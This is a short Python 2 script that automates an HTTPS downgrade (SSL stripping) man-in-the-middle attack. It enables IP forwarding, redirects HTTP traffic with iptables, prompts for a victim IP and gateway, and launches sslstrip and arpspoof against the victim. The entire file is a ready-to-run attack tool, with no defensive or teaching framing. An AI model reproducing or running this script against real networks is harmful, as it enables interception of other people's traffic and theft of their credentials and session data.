import os
import subprocess
import time

time.sleep(2)
print "\n--------------------------------------------------------------------------------"
print "\n\t\t\t    Https Downgrade Attack"
print "\n--------------------------------------------------------------------------------"
time.sleep(2)
print "\nFlipping your machine into forwarding mode......."
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
time.sleep(2)
listen = int(input("\nEnter the port number which you want to set as listening port (Don't know what to set ? Just go for 8080 ) : "))
print "\nSetting up iptables to redirect HTTP traffic to sslstrip..........."
os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port {}'.format(listen))
time.sleep(2)
print "\nGet your Gateway address from this Table.\n"
os.system('route -n')
time.sleep(2)
victim = raw_input("\nEnter victim IP address : ")
gateway = raw_input("\nEnter your Gateway : ")
interface = raw_input("\nEnter your Interface : ")
time.sleep(2)
process1 = subprocess.Popen(
    "sudo gnome-terminal -x python sslstrip.py -l {} &".format(listen), 
    stdout=subprocess.PIPE,
    stderr=None,
    shell=True
)
process2 = subprocess.Popen(
    "sudo gnome-terminal -x arpspoof -i {0} -t {1} {2} ".format(interface,victim,gateway), 
    stdout=subprocess.PIPE,
    stderr=None,
    shell=True
)
time.sleep(2)
print "\nYour attack is up and running.........."
time.sleep(2)
print "\nInorder to view the stats of the attack you need to run cat sslstrip.log command in  new terminal........\n"
'''
process3 = subprocess.Popen(
    "sudo gnome-terminal -x cat sslstrip.log ", 
    stdout=subprocess.PIPE,
    stderr=None,
    shell=True
)
'''
time.sleep(2)


